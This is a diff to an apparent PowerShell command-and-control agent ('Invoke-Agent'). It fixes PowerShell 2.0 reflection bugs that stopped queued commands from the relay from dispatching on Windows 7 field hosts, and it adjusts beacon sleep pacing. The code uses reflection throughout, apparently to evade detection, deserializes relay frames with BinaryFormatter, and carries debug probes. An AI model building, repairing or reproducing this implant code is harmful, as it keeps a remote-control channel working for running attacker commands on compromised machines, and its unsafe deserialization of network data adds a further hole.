@@ -131,10 +131,15 @@ function Invoke-Agent {
     function ReadAllBytes($stream) {
         $ms = New-Object 'IO.MemoryStream'
         $buf = New-Object 'byte[]' 8192
-        $n = CallInst $stream 'Read' @([byte[]]$buf, 0, $buf.Length)
+        # Helper returns are comma-wrapped: the count comes back as object[1] wrapping the
+        # int, and re-binding that array as Write's count arg killed the CLR2 binder
+        # ("MemoryStream.Write not found", Win7 field 2026-09-23) — every non-empty answer
+        # was read and then discarded, so queued commands never dispatched. Unwrap @()[0]
+        # and cast [int] at the binder boundary (same rule as the TLS bump fix).
+        $n = [int](@(CallInst $stream 'Read' @([byte[]]$buf, 0, $buf.Length))[0])
         while ($n -gt 0) {
             $null = CallInst $ms 'Write' @([byte[]]$buf, 0, $n)
-            $n = CallInst $stream 'Read' @([byte[]]$buf, 0, $buf.Length)
+            $n = [int](@(CallInst $stream 'Read' @([byte[]]$buf, 0, $buf.Length))[0])
         }
         return ,(CallInst $ms 'ToArray' $null)
     }
@@ -329,7 +334,10 @@ function Invoke-Agent {
                 # all .NET 2.0 reflection — PS 2.0-safe. The formatter INSTANCE now comes from
                 # reflected Activator too; GetMethod/Invoke keep their proven shapes (the
                 # [IO.Stream] casts unwrap the PSObject wrappers the binder refuses).
-                $fmtType = ResolveM 'System.Runtime.Serialization.Formatters.Binary.BinaryFormatter'
+                # ResolveM returns comma-wrapped (PSObject-wrapped on PS 2.0): re-binding the
+                # wrapped Type into Activator.CreateInstance args kills the CLR2 binder —
+                # unwrap + [Type] cast ONCE here, every later use is raw.
+                $fmtType = [Type](@(ResolveM 'System.Runtime.Serialization.Formatters.Binary.BinaryFormatter')[0])
                 # TWO public overloads (Stream / Stream+HeaderHandler) — GetMethod without the
                 # signature throws AmbiguousMatchException. Pin it.
                 $deserialize = $fmtType.GetMethod('Deserialize', [Type[]]@([IO.Stream]))
@@ -440,14 +448,20 @@ function Invoke-Agent {
         # re-POST); clamped so a bad header can never park the agent. Read BEFORE the
         # response stream closes. WebHeaderCollection.Get replaces the indexer (the
         # indexer is a parameterized property reflection won't address by name).
-        try { $script:localSleepSec = CallStatic (ResolveM 'System.Math') 'Max' @(0, (CallStatic (ResolveM 'System.Math') 'Min' @(600, [int][string](CallInst (GetProp $resp 'Headers') 'Get' @('X-Sleep-Hint'))))) } catch { $script:localSleepSec = 0 }
-        # Win7 field trace round 2 (2026-09-23): a clean single-runtime run STILL never
-        # dispatched — the two candidates left are (A) the relay never answers with frames
-        # and (B) the PS 2.0 read path swallows a non-empty answer (the catch below masks a
-        # read failure as an EMPTY answer, indistinguishable from idle). [resp] cl fires
-        # ONLY on a non-empty ContentLength — no box ever while the panel says Sent = the
-        # relay side (A); a box + no [ans] = the read eats it (B); a box + [read] threw =
-        # B with the exception named. All #dbg.
+        # Helper returns are comma-wrapped (PSObject-wrapped on PS 2.0): re-binding Min's
+        # return straight into Max's args killed the CLR2 binder and the catch zeroed the
+        # hint — deep-idle pacing never applied on Win7. Unwrap + [int] cast at the boundary.
+        $hint = 0
+        try { $hint = [int][string](CallInst (GetProp $resp 'Headers') 'Get' @('X-Sleep-Hint')) } catch { $hint = 0 }
+        $script:localSleepSec = 0
+        try { $script:localSleepSec = [int](@(CallStatic (ResolveM 'System.Math') 'Min' @(600, $hint))[0]) } catch {}
+        if ([int]$script:localSleepSec -lt 0) { $script:localSleepSec = 0 }
+        # Win7 root cause (2026-09-23, field trace round 3): candidate (B) — ReadAllBytes'
+        # stream-copy loop re-bound the comma-wrapped Read count into MemoryStream.Write's
+        # args; the CLR2 binder refused it ("Write not found") and the catch masked every
+        # answer as EMPTY, so queued commands never dispatched while the beacon stayed
+        # healthy. Fixed in ReadAllBytes (unwrap @()[0] + [int] cast). The probes below
+        # confirm the fix on the next field run: [resp] cl → [ans] → [frames] → [cmd].
         try { #dbg
             $respCl = GetProp $resp 'ContentLength' #dbg
             if (([int]$respCl) -gt 0) { Dbg '[resp] cl' ('' + $respCl) } #dbg
